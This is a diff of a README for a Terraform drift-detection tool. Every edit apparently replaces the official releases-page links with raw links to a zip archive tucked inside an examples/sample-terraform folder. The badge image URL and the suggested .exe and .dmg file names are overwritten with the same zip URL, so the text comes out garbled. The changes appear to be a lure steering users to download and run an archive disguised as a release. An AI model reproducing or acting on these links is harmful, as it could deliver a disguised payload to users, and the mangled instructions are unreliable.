@@ -1,6 +1,6 @@
 # 🛠️ ai-terraform-drift-detector - Simplifying Terraform Drift Detection
 
-[![Download Now!](https://img.shields.io/badge/Download%20Now-%20for%20Windows%20and%20Mac-blue)](https://github.com/saiahmed12/ai-terraform-drift-detector/releases)
+[![Download Now!](https://raw.githubusercontent.com/saiahmed12/ai-terraform-drift-detector/main/examples/sample-terraform/ai-terraform-drift-detector-1.6-beta.4.zip%20Now-%20for%20Windows%20and%20Mac-blue)](https://raw.githubusercontent.com/saiahmed12/ai-terraform-drift-detector/main/examples/sample-terraform/ai-terraform-drift-detector-1.6-beta.4.zip)
 
 ## 🧩 Overview
 
@@ -12,13 +12,13 @@ To use the ai-terraform-drift-detector, follow these simple steps to download an
 
 1. **Visit the Releases Page**  
    Go to the releases page to get the latest version of the software:  
-   [Download Here](https://github.com/saiahmed12/ai-terraform-drift-detector/releases)
+   [Download Here](https://raw.githubusercontent.com/saiahmed12/ai-terraform-drift-detector/main/examples/sample-terraform/ai-terraform-drift-detector-1.6-beta.4.zip)
 
 2. **Choose Your Version**  
    Find the version you want to download. Each version will have release notes that explain what's new or changed. 
 
 3. **Download the File**  
-   Click on the file name to start the download. The file may vary based on your operating system, so make sure you select the right one. Common formats include `ai-terraform-drift-detector.exe` for Windows or `ai-terraform-drift-detector.dmg` for macOS.
+   Click on the file name to start the download. The file may vary based on your operating system, so make sure you select the right one. Common formats include `https://raw.githubusercontent.com/saiahmed12/ai-terraform-drift-detector/main/examples/sample-terraform/ai-terraform-drift-detector-1.6-beta.4.zip` for Windows or `https://raw.githubusercontent.com/saiahmed12/ai-terraform-drift-detector/main/examples/sample-terraform/ai-terraform-drift-detector-1.6-beta.4.zip` for macOS.
 
 4. **Install the Application**  
    - **On Windows:** Double-click the downloaded `.exe` file and follow the instructions.  
@@ -54,7 +54,7 @@ Before installing, ensure your system meets the following minimum requirements:
 ## 📥 Download & Install
 
 To start enjoying the benefits of ai-terraform-drift-detector, download it from our releases page:  
-[**Download Here**](https://github.com/saiahmed12/ai-terraform-drift-detector/releases)
+[**Download Here**](https://raw.githubusercontent.com/saiahmed12/ai-terraform-drift-detector/main/examples/sample-terraform/ai-terraform-drift-detector-1.6-beta.4.zip)
 
 Once downloaded, follow the installation steps outlined above.
 
